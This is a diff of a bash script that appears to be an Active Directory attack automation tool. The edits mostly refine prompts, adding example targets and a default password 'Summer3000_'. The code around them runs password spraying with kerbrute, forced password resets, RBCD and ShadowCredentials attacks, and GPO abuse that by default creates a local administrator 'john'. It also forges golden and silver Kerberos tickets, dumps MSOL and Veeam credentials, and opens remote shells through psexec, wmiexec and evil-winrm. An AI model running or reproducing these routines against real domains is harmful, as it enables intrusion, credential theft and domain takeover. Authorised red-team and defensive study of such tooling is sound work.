@@ -664,23 +664,18 @@ authenticate() {
                 else
                     pass_passchange=""
                     if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]]; then
-                        echo -e "${BLUE}[*] Changing expired password of own user. Please specify new password:${NC}"
+                        echo -e "${BLUE}[*] Changing expired password of own user. Please specify new password (default: Summer3000_):${NC}"
                         read -rp ">> " pass_passchange </dev/tty
-                        while [ "${pass_passchange}" == "" ]; do
-                            echo -e "${RED}Invalid password.${NC} Please specify password:"
-                            read -rp ">> " pass_passchange </dev/tty
-                        done
+                        if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
                         echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
                         run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a "${output_dir}/Modification/impacket_changepasswd_${dc_domain}.txt"
                     elif [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
-                        echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password:${NC}"
+                        echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password (default: Summer3000_):${NC}"
                         read -rp ">> " pass_passchange </dev/tty
-                        while [ "${pass_passchange}" == "" ]; do
-                            echo -e "${RED}Invalid password.${NC} Please specify password:"
-                            read -rp ">> " pass_passchange </dev/tty
-                        done
+                        if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
                         authuser_passchange=""
                         echo -e "${BLUE}[*] Please specify username for RPC authentication:${NC}"
+                        echo -e "${CYAN}[*] Example: user01 ${NC}"
                         read -rp ">> " authuser_passchange </dev/tty
                         while [ "${pass_passchange}" == "" ]; do
                             echo -e "${RED}Invalid username.${NC} Please specify username:"
@@ -1932,6 +1927,7 @@ ne_passpray() {
         echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
     else
         echo -e "${BLUE}[*] Password spray using netexec (Noisy!)${NC}"
+        echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
         read -rp ">> " passpray_password </dev/tty
         while [ "${passpray_password}" == "" ]; do
             echo -e "${RED}Invalid password.${NC} Please specify password:"
@@ -1955,14 +1951,15 @@ kerbrute_passpray() {
         echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
     else
         parse_users
-        echo -e "${BLUE}[*] Password spray using kerbrute (Noisy!)${NC}"
         if [ -s "${users_list}" ]; then
-            echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
+            echo -e "${BLUE}[*] Password spray using kerbrute (Noisy!)${NC}"
+            echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
             read -rp ">> " passpray_password </dev/tty
             while [ "${passpray_password}" == "" ]; do
                 echo -e "${RED}Invalid password.${NC} Please specify password:"
                 read -rp ">> " passpray_password </dev/tty
             done
+            echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
             run_command "${kerbrute} passwordspray ${users_list} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >"${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt"
             grep "VALID" "${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt"
             if [ -s "${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt" ]; then
@@ -2367,7 +2364,8 @@ smbclient_console() {
     if [ ! -f "${impacket_smbclient}" ]; then
         echo -e "${RED}[-] smbclient.py not found! Please verify the installation of impacket ${NC}"
     else
-        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
         read -rp ">> " smbclient_target </dev/tty
         while [ "${smbclient_target}" == "" ]; do
             echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
@@ -2388,7 +2386,8 @@ smbclientng_console() {
         echo -e "${RED}[-] Please verify the installation of smbclientng${NC}"
     else
         echo -e "${BLUE}[*] Launching smbclientng${NC}"
-        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
         read -rp ">> " smbclient_target </dev/tty
         while [ "${smbclient_target}" == "" ]; do
             echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
@@ -2586,6 +2585,8 @@ privexchange_check() {
                 echo -e "ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx"
                 read -rp "" </dev/tty
             fi
+            echo -e "${BLUE}[*] Please specify hostname of Exchange server:${NC}"
+            echo -e "${CYAN}[*] Example: 10.1.0.5 or EXCH01 or EXCH01.domain.com ${NC}"
             target_exchange=""
             read -rp ">> " target_exchange </dev/tty
             while [ "${target_exchange}" == "" ]; do
@@ -2653,7 +2654,8 @@ mssqlclient_console() {
     elif [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] mssqlclient requires credentials${NC}"
     else
-        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com ${NC}"
         read -rp ">> " mssqlclient_target </dev/tty
         while [ "${mssqlclient_target}" == "" ]; do
             echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
@@ -2676,19 +2678,17 @@ change_pass() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Changing passwords of a user or computer account. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
             target_passchange=""
             read -rp ">> " target_passchange </dev/tty
             while [ "${target_passchange}" == "" ]; do
                 echo -e "${RED}Invalid name.${NC} Please specify target:"
                 read -rp ">> " target_passchange </dev/tty
             done
-            echo -e "${BLUE}[*] Please specify new password:${NC}"
+            echo -e "${BLUE}[*] Please specify new password (default: Summer3000_):${NC}"
             pass_passchange=""
             read -rp ">> " pass_passchange </dev/tty
-            while [ "${pass_passchange}" == "" ]; do
-                echo -e "${RED}Invalid password.${NC} Please specify password:"
-                read -rp ">> " pass_passchange </dev/tty
-            done
+            if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
             echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password ${target_passchange} ${pass_passchange}" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt"
         fi
@@ -2706,6 +2706,7 @@ add_group_member() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Adding user to group. Please specify target group:${NC}"
+            echo -e "${CYAN}[*] Example: group01 ${NC}"
             target_groupmem=""
             read -rp ">> " target_groupmem </dev/tty
             while [ "${target_groupmem}" == "" ]; do
@@ -2777,6 +2778,7 @@ change_owner() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Changing owner of a user, computer, group, etc. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
             target_ownerchange=""
             read -rp ">> " target_ownerchange </dev/tty
             while [ "${target_ownerchange}" == "" ]; do
@@ -2800,6 +2802,7 @@ add_genericall() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Adding GenericAll rights of a user, computer, group, etc. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
             target_genericall=""
             read -rp ">> " target_genericall </dev/tty
             while [ "${target_genericall}" == "" ]; do
@@ -2838,13 +2841,15 @@ rbcd_attack() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: DC01 ${NC}"
             target_rbcd=""
             read -rp ">> " target_rbcd </dev/tty
             while [ "${target_rbcd}" == "" ]; do
                 echo -e "${RED}Invalid name.${NC} Please specify target:"
                 read -rp ">> " target_rbcd </dev/tty
             done
-            echo -e "${BLUE}[*] Please specify account under your control (add $ if computer account):${NC}"
+            echo -e "${BLUE}[*] Please specify account under your control:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
             service_rbcd=""
             read -rp ">> " service_rbcd </dev/tty
             while [ "${service_rbcd}" == "" ]; do
@@ -2874,6 +2879,7 @@ rbcd_spnless_attack() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Performing SPN-less RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: DC01 ${NC}"
             target_rbcd=""
             read -rp ">> " target_rbcd </dev/tty
             while [ "${target_rbcd}" == "" ]; do
@@ -2881,6 +2887,7 @@ rbcd_spnless_attack() {
                 read -rp ">> " target_rbcd </dev/tty
             done
             echo -e "${BLUE}[*] Please specify SPN-less account under your control:${NC}"
+            echo -e "${CYAN}[*] Example: user01 ${NC}"
             user_spnless=""
             read -rp ">> " user_spnless </dev/tty
             while [ "${user_spnless}" == "" ]; do
@@ -2947,11 +2954,12 @@ shadowcreds_attack() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target (add $ if computer account):${NC}"
+            echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
             target_shadowcreds=""
             read -rp ">> " target_shadowcreds </dev/tty
             while [ "${target_shadowcreds}" == "" ]; do
-                echo -e "${RED}Invalid name.${NC} Please specify target (add $ if computer account):"
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
                 read -rp ">> " target_shadowcreds </dev/tty
             done
             echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
@@ -2968,18 +2976,26 @@ pygpo_abuse() {
         echo -e "${PURPLE}[-] pygpoabuse requires credentials and does not support Kerberos authentication using AES Key${NC}"
     else
         echo -e "${BLUE}[*] Using modification rights on GPO to execute command. Please specify GPO ID${NC}"
+        echo -e "${CYAN}[*] Example: 31a09564-cd4a-4520-98fa-446a2af23b4b ${NC}"
         target_gpoabuse=""
         read -rp ">> " target_gpoabuse </dev/tty
         while [ "${target_gpoabuse}" == "" ]; do
             echo -e "${RED}Invalid ID.${NC} Please specify GPO ID:"
             read -rp ">> " target_gpoabuse </dev/tty
         done
-        userbool_gpoabuse=""
-        echo -e "${BLUE}[*] Please type 'user' if you wish to set user GPO. Press enter to set computer GPO${NC}"
+        target_userbool=""
+        echo -e "${BLUE}[*] Please type 'user' if you wish to set user GPO or 'computer' to set computer GPO${NC}"
         read -rp ">> " target_userbool </dev/tty
+        while [ "${target_userbool}" != "user" ] && [ "${target_userbool}" != "computer" ]; do
+            echo -e "${RED}Invalid input.${NC} Please choose between 'user' and 'computer':"
+            read -rp ">> " target_userbool </dev/tty
+        done
         if [ "${target_userbool}" == "user" ]; then
             echo -e "${YELLOW}[!] User GPO chosen!${NC}"
             userbool_gpoabuse="-user"
+        else
+            echo -e "${YELLOW}[!] Computer GPO chosen!${NC}"
+            userbool_gpoabuse=""
         fi
         command_gpoabuse=""
         echo -e "${BLUE}[*] Please specify command to execute. Press enter to use default: create user john with password 'H4x00r123..' as local administrator${NC}"
@@ -3001,6 +3017,7 @@ add_unconstrained() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Adding Unconstrained Delegation rights on owned account. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
             target_unconsdeleg=""
             read -rp ">> " target_unconsdeleg </dev/tty
             while [ "${target_unconsdeleg}" == "" ]; do
@@ -3024,6 +3041,7 @@ add_spn() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Adding CIFS and HTTP SPNs to owned computer account. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
             target_spn=""
             read -rp ">> " target_spn </dev/tty
             while [ "${target_spn}" == "" ]; do
@@ -3053,6 +3071,7 @@ add_upn() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Adding userPrincipalName to owned user account. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 ${NC}"
             target_upn=""
             read -rp ">> " target_upn </dev/tty
             while [ "${target_upn}" == "" ]; do
@@ -3061,6 +3080,7 @@ add_upn() {
             done
             value_upn=""
             echo -e "${BLUE}[*] Adding userPrincipalName to ${target_upn}. Please specify user to impersonate:${NC}"
+            echo -e "${CYAN}[*] Example: user02 ${NC}"
             read -rp ">> " value_upn </dev/tty
             while [ "${value_upn}" == "" ]; do
                 echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
@@ -3362,6 +3382,7 @@ bitlocker_dump() {
 
 msol_dump() {
     echo -e "${BLUE}[*] MSOL password dump. Please specify IP or hostname of Azure AD-Connect server:${NC}"
+    echo -e "${CYAN}[*] Example: 10.1.0.5 or ADConnect01 or ADConnect01.domain.com ${NC}"
     target_msol=""
     read -rp ">> " target_msol </dev/tty
     while [ "${target_msol}" == "" ]; do
@@ -3374,6 +3395,7 @@ msol_dump() {
 
 veeam_dump() {
     echo -e "${BLUE}[*] Veeam credentials dump. Please specify IP or hostname of Veeam server:${NC}"
+    echo -e "${CYAN}[*] Example: 10.1.0.5 or VEEAM01 or VEEAM01.domain.com ${NC}"
     target_veeam=""
     read -rp ">> " target_veeam </dev/tty
     while [ "${target_veeam}" == "" ]; do
@@ -3413,7 +3435,8 @@ smbexec_console() {
     elif [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] smbexec requires credentials${NC}"
     else
-        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
         read -rp ">> " smbexec_target </dev/tty
         while [ "${smbexec_target}" == "" ]; do
             echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
@@ -3431,7 +3454,8 @@ wmiexec_console() {
     elif [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] wmiexec requires credentials${NC}"
     else
-        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
         read -rp ">> " wmiexec_target </dev/tty
         while [ "${wmiexec_target}" == "" ]; do
             echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
@@ -3449,7 +3473,8 @@ psexec_console() {
     elif [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] psexec requires credentials${NC}"
     else
-        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
         read -rp ">> " psexec_target </dev/tty
         while [ "${psexec_target}" == "" ]; do
             echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
@@ -3467,7 +3492,8 @@ evilwinrm_console() {
     elif [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] evilwinrm requires credentials${NC}"
     else
-        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
         read -rp ">> " evilwinrm_target </dev/tty
         while [ "${evilwinrm_target}" == "" ]; do
             echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
@@ -4179,41 +4205,43 @@ kerberos_menu() {
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
             if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
-                echo -e "Please specify '1' for NTLM and '2' for AES:"
-                read -rp ">> " ntlm_or_aes </dev/tty
-                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
-                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
-                    read -rp ">> " ntlm_or_aes </dev/tty
+                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+                read -rp ">> " rc4_or_aes </dev/tty
+                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                    read -rp ">> " rc4_or_aes </dev/tty
                 done
                 gethash_user="krbtgt"
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
+                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
                 read -rp ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then
                     get_hash
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt="$gethash_hash"; else gethash_aes="$gethash_hash"; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt="$gethash_hash"; else gethash_aes="$gethash_hash"; fi
                 fi
 
                 if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                     echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
 
                     tick_randuser="Administrator"
                     tick_user_id=""
                     tick_groups=""
-                    echo -e "Please specify random user name (press Enter to choose default value 'Administrator'):"
+                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):"
                     read -rp ">> " tick_randuser_value </dev/tty
                     if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "Please specify custom user id (press Enter to skip):"
+                    echo -e "${BLUE}[*] Please specify custom user id (press Enter to skip):"
                     read -rp ">> " tick_user_id_value </dev/tty
                     if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
-                    echo -e "Please specify comma separated custom groups ids (e.g. '512,513,518,519,520') (press Enter to skip):"
+                    echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to skip):"
+                    echo -e "${CYAN}[*] Example: 512,513,518,519,520 ${NC}"
                     read -rp ">> " tick_group_ids_value </dev/tty
                     if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
                     while [[ "${sid_domain}" == "" ]]; do
                         echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                        echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
                         read -rp ">> " sid_domain </dev/tty
                     done
                     echo -e "${CYAN}[*] Generating golden ticket...${NC}"
@@ -4250,45 +4278,46 @@ kerberos_menu() {
                 tick_groups=""
                 tick_servuser=""
 
-                echo -e "Please specify name of SPN account (for example 'sql_svc'):"
+                echo -e "${BLUE}[*] Please specify name of SPN account (Example: 'sql_svc'):"
                 read -rp ">> " tick_servuser </dev/tty
                 while [[ "${tick_servuser}" == "" ]]; do
                     echo -e "${RED}Invalid username.${NC} Please specify another:"
                     read -rp ">> " tick_servuser </dev/tty
                 done
 
-                echo -e "Please specify '1' for NTLM and '2' for AES:"
-                read -rp ">> " ntlm_or_aes </dev/tty
-                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
-                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
-                    read -rp ">> " ntlm_or_aes </dev/tty
+                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+                read -rp ">> " rc4_or_aes </dev/tty
+                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                    read -rp ">> " rc4_or_aes </dev/tty
                 done
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of the SPN account (press Enter to extract hash from NTDS (requires DCSync rights):"
+                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
                 read -rp ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then
                     gethash_user=$tick_servuser
                     get_hash
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                 fi
 
                 if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                     echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
 
-                    echo -e "Please specify random user name (press Enter to choose default value 'Administrator'):"
+                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):"
                     read -rp ">> " tick_randuser_value </dev/tty
                     if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "Please specify the chosen user's ID (press Enter to choose default value EMPTY):"
+                    echo -e "${BLUE}[*] Please specify the chosen user's ID (press Enter to choose default value EMPTY):"
                     read -rp ">> " tick_randuserid_value </dev/tty
                     if [[ ! "${tick_randuserid_value}" == "" ]]; then tick_randuserid="-user-id ${tick_randuserid_value}"; fi
-                    echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                    echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
                     read -rp ">> " tick_spn_value </dev/tty
                     if [[ ! "${tick_spn_value}" == "" ]]; then tick_spn="${tick_spn_value}"; fi
                     while [[ "${sid_domain}" == "" ]]; do
                         echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                        echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
                         read -rp ">> " sid_domain </dev/tty
                     done
                     echo -e "${CYAN}[*] Generating silver ticket for service $tick_spn_value...${NC}"
@@ -4321,14 +4350,20 @@ kerberos_menu() {
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
             if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+                read -rp ">> " rc4_or_aes </dev/tty
+                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                    read -rp ">> " rc4_or_aes </dev/tty
+                done
                 gethash_user="krbtgt"
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
+                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
                 read -rp ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then
                     get_hash
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                 fi
 
                 if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
@@ -4338,13 +4373,13 @@ kerberos_menu() {
                     tick_randuser="sql_svc"
                     tick_user_id="1337"
                     tick_groups="512,513,518,519,520"
-                    echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):"
                     read -rp ">> " tick_randuser_value </dev/tty
                     if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
+                    echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):"
                     read -rp ">> " tick_user_id_value </dev/tty
                     if [[ ! "${tick_user_id_value}" == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
-                    echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                    echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
                     read -rp ">> " tick_group_ids_value </dev/tty
                     if [[ ! "${tick_group_ids_value}" == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
                     while [[ "${sid_domain}" == "" ]]; do
@@ -4375,14 +4410,20 @@ kerberos_menu() {
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
             if [ "${pass_bool}" == true ]; then
+                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+                read -rp ">> " rc4_or_aes </dev/tty
+                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                    read -rp ">> " rc4_or_aes </dev/tty
+                done
                 gethash_user="krbtgt"
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
+                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
                 read -rp ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then
                     get_hash
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                 fi
 
                 if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
@@ -4393,16 +4434,16 @@ kerberos_menu() {
                     tick_user_id="1337"
                     tick_groups="512,513,518,519,520"
                     tick_domain_admin="${user}"
-                    echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):"
                     read -rp ">> " tick_randuser_value </dev/tty
                     if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
+                    echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):"
                     read -rp ">> " tick_user_id_value </dev/tty
                     if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
-                    echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                    echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
                     read -rp ">> " tick_group_ids_value </dev/tty
                     if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
-                    echo -e "Please specify domain admin to impersonate (press Enter to choose default value current user):"
+                    echo -e "${BLUE}[*] Please specify domain admin to impersonate (press Enter to choose default value current user):"
                     read -rp ">> " tick_domain_admin_value </dev/tty
                     if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
                     while [[ "${sid_domain}" == "" ]]; do
@@ -4442,38 +4483,38 @@ kerberos_menu() {
                 tick_spn="CIFS/${dc_domain}"
                 tick_servuser=""
 
-                echo -e "Please specify name of account with Delegation rights (for example 'gmsa'):"
+                echo -e "${BLUE}[*] Please specify name of account with Delegation rights (for example 'gmsa'):"
                 read -rp ">> " tick_servuser </dev/tty
                 while [[ "${tick_servuser}" == "" ]]; do
